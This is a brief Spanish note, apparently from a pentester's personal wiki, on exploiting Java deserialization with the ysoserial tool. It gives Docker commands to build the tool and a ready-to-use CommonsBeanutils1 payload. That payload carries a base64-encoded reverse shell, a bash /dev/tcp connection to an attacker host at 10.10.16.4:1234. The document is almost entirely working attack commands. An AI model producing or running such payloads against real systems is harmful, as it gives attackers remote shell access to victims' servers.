
[[Deserialización]] de java

Herramienta para la serialización de java.

```bash
git clone https://github.com/frohoff/ysoserial?tab=readme-ov-file
cd ysoserial
docker build . -t ysoserial
```

La herramienta ofrece una variedad de cargas útiles preconstruidas que aprovechan diferentes bibliotecas y patrones de código comunes en Java que son vulnerables a la explotación de deserialización.


```bash
docker run ysoserial CommonsBeanutils1 'bash -c echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40LzEyMzQgMD4mMQ==|base64${IFS}-d|bash'
```